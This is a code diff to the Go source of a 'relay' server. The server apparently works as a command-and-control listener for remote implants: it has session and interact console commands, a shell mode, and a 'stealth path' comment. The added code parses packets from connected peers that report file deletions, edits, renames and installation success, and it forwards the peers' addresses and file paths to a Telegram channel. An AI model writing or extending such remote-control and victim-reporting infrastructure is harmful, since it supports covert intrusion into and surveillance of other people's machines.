@@ -58,6 +58,82 @@ func init() {
 	logger = log.New(crlfOut, "[RELAY] ", log.LstdFlags|log.Lmicroseconds)
 }
 
+const (
+	PH_CMD_PING            = 0x06
+	PH_CMD_FILE_DELETE     = 0x40
+	PH_CMD_FILE_EDIT       = 0x41
+	PH_CMD_FILE_RENAME     = 0x42
+	PH_CMD_INSTALL_SUCCESS = 0x43
+)
+
+func backgroundPacketProcessor(peerID string, conn net.Conn, remoteAddr string) {
+	defer conn.Close()
+	buffer := make([]byte, 8192)
+
+	for {
+		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
+		n, err := conn.Read(buffer)
+		if err != nil {
+			if err != io.EOF {
+				logger.Printf("Peer %s disconnected or read error: %v", peerID, err)
+			}
+			return
+		}
+
+		if n < 11 { // Min header size
+			continue
+		}
+
+		// Header format: PHNT (4) | Opcode (1) | ChunkIdx (2) | TotalChunks (2) | ChunkLen (2)
+		if string(buffer[0:4]) != "PHNT" {
+			continue
+		}
+
+		opcode := buffer[4]
+		chunkLen := binary.LittleEndian.Uint16(buffer[9:11])
+		if n < int(11+chunkLen) {
+			continue
+		}
+
+		payload := string(buffer[11 : 11+chunkLen])
+		hostname, _ := os.Hostname()
+		user := "root" // Default for stealth path
+
+		var eventType string
+		switch opcode {
+		case PH_CMD_FILE_DELETE:
+			eventType = "FILE_DELETE"
+		case PH_CMD_FILE_EDIT:
+			eventType = "FILE_EDIT"
+		case PH_CMD_FILE_RENAME:
+			eventType = "FILE_RENAME"
+		case PH_CMD_INSTALL_SUCCESS:
+			eventType = "INSTALL_SUCCESS"
+		case PH_CMD_PING:
+			continue
+		default:
+			continue
+		}
+
+		if eventType != "" {
+			logger.Printf("[ALERT] %s from %s: %s", eventType, remoteAddr, payload)
+			err := telegram.SendProfessionalAlert(telegram.AlertData{
+				EventType: eventType,
+				Hostname:  hostname,
+				User:      user,
+				IP:        remoteAddr,
+				FilePath:  payload,
+				Details:   fmt.Sprintf("Real-time event captured by V1.0 agent monitor"),
+			})
+			if err != nil {
+				logger.Printf("[ERROR] Failed to send Telegram notification: %v", err)
+			} else {
+				logger.Printf("[SUCCESS] Telegram notification sent for %s", eventType)
+			}
+		}
+	}
+}
+
 func main() {
 	listenAddr := flag.String("listen", "", "Listen address (e.g., :42291). Overrides RELAY_LISTEN_ADDR env var")
 	flag.Parse()
@@ -180,7 +256,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	}
 
 	version := handshakeBuf[4]
-	if version != 0x03 {
+	if version != 0x01 { // V1.0 Supreme Standard
 		logger.Printf("Unsupported protocol version from %s: 0x%02x", remoteAddr, version)
 		conn.Close()
 		return
@@ -191,8 +267,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 
 	peerID := fmt.Sprintf("peer-%d", time.Now().UnixNano())
 
-	peerInfo, err := registry.AddPeer(peerID, conn)
-	if err != nil {
+	if _, err := registry.AddPeer(peerID, conn); err != nil {
 		logger.Printf("Failed to add peer %s: %v", peerID, err)
 		conn.Close()
 		return
@@ -217,7 +292,8 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	
 	logger.Printf("Peer %s ready. Use 'sessions' and 'interact %s' in console.", peerID, peerID)
 
-	_ = peerInfo
+	// Start background processor for real-time monitoring alerts
+	go backgroundPacketProcessor(peerID, conn, remoteAddr)
 }
 
 func cleanupInactivePeers(registry *peer.Registry, timeout time.Duration) {
@@ -441,7 +517,14 @@ func readCommandResponseWithMode(conn net.Conn, shellMode bool) {
 			io.ReadFull(conn, dataBuf)
 			payload := string(dataBuf)
 			logger.Printf("Received Sentinel Alert: %s", payload)
-			go telegram.RelayTelegramAlert(payload)
+			go telegram.SendProfessionalAlert(telegram.AlertData{
+				EventType: "CONSOLE_ALERT",
+				Hostname:  "RELAY",
+				User:      "ADMIN",
+				IP:        "127.0.0.1",
+				FilePath:  "N/A",
+				Details:   payload,
+			})
 			continue
 		}
 
